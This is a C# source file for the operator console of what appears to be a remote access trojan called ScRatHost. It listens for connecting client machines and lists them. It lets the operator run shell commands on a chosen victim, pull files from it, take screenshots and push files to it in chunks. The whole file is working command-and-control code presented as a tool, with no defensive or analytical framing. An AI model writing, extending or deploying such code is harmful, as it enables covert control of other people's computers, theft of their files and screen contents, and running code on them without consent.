using ScRatHost.net;
using System;
using System.IO;
using System.Text;
using System.Threading;

namespace ScRatHost
{
    class Program
    {
        static int getPort()
        {
            int port = -1;
            while(port == -1)
            {
                Console.Write("Enter port to listen on: ");
                string p = Console.ReadLine();
                try
                {
                    port = Int32.Parse(p);
                }
                catch (Exception)
                {
                    Console.WriteLine("Error: Invalid port!");
                }
            }
            return port;
        }
        static void Main(){
            Server server = new Server(getPort());
            new Thread(server.run).Start();
            string currentId = "";
            while (true)
            {
                string input = Console.ReadLine();
                int separatorIndex = input.IndexOf(' ');
                string cmd = input;
                string args = "";
                if (separatorIndex != -1)
                {
                    args = input.Substring(separatorIndex + 1);
                    cmd = input.Substring(0, separatorIndex);
                }

                if(cmd == "setid")
                {
                    currentId = args;
                    server.ConsoleWriteLine("Set Id to: " + currentId);
                }
                else if(cmd == "getid")
                {
                    server.ConsoleWriteLine("ID:      Name:       IP:");
                    string[] ids = server.getAllIDs();
                    for(int i = 0; i < ids.Length; i++)
                    {
                        if(server.clients.TryGetValue(ids[i], out Client client))
                        {
                            Console.WriteLine(ids[i] + " " + client.name + " " + client.ip);
                        }
                    }
                }
                else if (cmd == "ssh")
                {
                    server.sendPacket(new Packet(PacketType.Shell, Encoding.ASCII.GetBytes(args)), currentId);
                }
                else if (cmd == "exit")
                {
                    server.sendPacket(new Packet(PacketType.Exit, new byte[0] { }), currentId);
                }
                else if (cmd == "download")
                {
                    server.sendPacket(new Packet(PacketType.Download, Encoding.ASCII.GetBytes(args)), currentId);
                }
                else if (cmd == "screenshot")
                {
                    server.sendPacket(new Packet(PacketType.Screenshot, Encoding.ASCII.GetBytes(args)), currentId);
                }
                else if (cmd == "stop")
                {
                    if(args == "exit") server.sendPacketToAll(new Packet(PacketType.Exit, new byte[0] { }));
                    Environment.Exit(0);
                }
                else if (cmd == "upload")
                {
                    string[] paths = args.Split(' ');
                    byte[] fileData = Helper.readFile(paths[0]);
                    server.ConsoleWriteLine("Reading file");
                    if (fileData == null)
                        server.ConsoleWriteLine("Error: file " + paths[0] + " does not exist!");
                    else
                    {
                        string sourceFileName = Path.GetFileName(paths[0]);
                        Console.WriteLine("Uploading file: " + sourceFileName + " to: " + paths[1]);
    
                        byte[] info = new byte[1 + 4 + 1 + paths[1].Length + 1];
                        info[0] = 0;
                        byte[] dataLength = BitConverter.GetBytes(fileData.Length);
                        dataLength.CopyTo(info, 1);
                        info[5] = (byte)paths[1].Length;
                        Array.Copy(Encoding.ASCII.GetBytes(paths[1]), 0, info, 6, paths[1].Length);
                        server.sendPacket(new Packet(PacketType.Upload, info), currentId);

                        int bufferSize = 1024;
                        int bytesSent = 0;
                        int bytesLeft = fileData.Length;

                        while (bytesLeft > 0)
                        {
                            int curDataSize = Math.Min(bufferSize, bytesLeft);

                            byte[] final = new byte[curDataSize + 1];
                            final[0] = 1;
                            Array.Copy(fileData, bytesSent, final, 1, curDataSize);
                            server.sendPacket(new Packet(PacketType.Upload, final), currentId);

                            bytesSent += curDataSize;
                            bytesLeft -= curDataSize;
                        }

                        server.sendPacket(new Packet(PacketType.Upload, new byte[1] { 2 }), currentId);
                        Console.WriteLine("Uploaded file: " + sourceFileName);
                    }
                }
                else
                {
                    server.ConsoleWriteLine("Command: \"" + cmd + "\" does not exit");
                }
            }
        }
    }
}
